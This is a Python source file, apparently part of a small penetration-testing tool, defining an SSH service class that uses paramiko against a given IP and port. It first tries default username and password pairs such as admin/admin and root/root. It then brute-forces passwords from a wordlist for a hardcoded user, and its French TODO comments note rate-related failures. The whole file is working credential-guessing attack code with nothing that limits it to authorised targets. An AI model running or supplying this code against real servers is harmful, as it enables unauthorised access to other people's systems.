from ipaddress import IPv4Address
from services.service import Service
from colorama import Fore, Back, Style
import paramiko
import sys
import os

class SshService(Service):
    def __init__(self, ip_addr: IPv4Address, port: int) -> None:
        super().__init__("SSH", ip_addr, port)
        self.wordlist_path = os.path.join(os.path.dirname(__file__), "wordlists", "ssh-wordlist.txt")

    def connect(self, username: str, password: str) -> bool:
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(str(self.ip_addr), port=self.port, username=username, password=password, timeout=5)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            print(f"[SSH ERROR] {e}")
            return False
        except Exception as e:
            print(f"[ERROR] {e}")
            return False

    def try_login(self) -> bool:
        
        default_credentials = [("admin", "admin"), ("root", "root"), ("user", "password"), ("boupboup", "superpassword")]
        for username, password in default_credentials:
            if self.connect(username, password):
                print(Fore.GREEN + f"[+] Default credentials found: {username}/{password}")
                print(Style.RESET_ALL)
                return True
        return False

    def bruteforce(self) -> bool:
        
        # TODO: investiguer si on relance le bruteforce trop souvent cpt, si on met trop de mots dans la wordlist cpt mais desfois ça remarche quand même
        username = "baptiste"  # TODO: Hardcoded for now, ask the user?
        attempt_count = 0

        try:
            with open(self.wordlist_path, "r") as wordlist:
                passwords = wordlist.readlines()
                total_attempts = len(passwords)

                for password in passwords:
                    password = password.strip()
                    attempt_count += 1

                    sys.stdout.write(f"\r[*] Bruteforce Attempts: {attempt_count}/{total_attempts}")
                    sys.stdout.flush()

                    if self.connect(username, password):
                        print(Fore.GREEN + f"\n[+] Brute-force success: {username}/{password}")
                        print(Style.RESET_ALL)
                        return True

            print("\n[-] Brute-force attempt finished, no valid credentials found.")
        except FileNotFoundError:
            print("\n[ERROR] Wordlist file not found at", self.wordlist_path)
        
        return False